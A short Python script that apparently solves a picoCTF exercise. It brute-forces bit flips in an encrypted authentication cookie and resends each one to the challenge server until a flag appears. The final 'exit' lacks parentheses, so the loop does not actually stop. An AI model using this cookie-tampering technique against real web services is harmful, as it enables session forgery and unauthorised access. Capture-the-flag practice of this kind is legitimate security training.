from base64 import b64decode, b64encode
import requests

CTF_PAGE = "http://mercury.picoctf.net:15614/"

session = requests.Session()
session.get(CTF_PAGE)
encrypted_cookie = session.cookies["auth_name"]

def bitFlip( pos, bit, data):
    raw = b64decode(b64decode(data).decode())

    list1 = bytearray(raw)
    list1[pos] = list1[pos] ^ bit
    raw = bytes(list1)
    return b64encode(b64encode(raw)).decode()



for i in range(128):
    for j in range(128):
        bitflipped_cookie = bitFlip(i, j, encrypted_cookie)
        print(bitflipped_cookie)
        request = requests.get(CTF_PAGE, cookies={"auth_name": bitflipped_cookie})
        if "picoCTF{" in request.text:
            print(request.text)
            exit
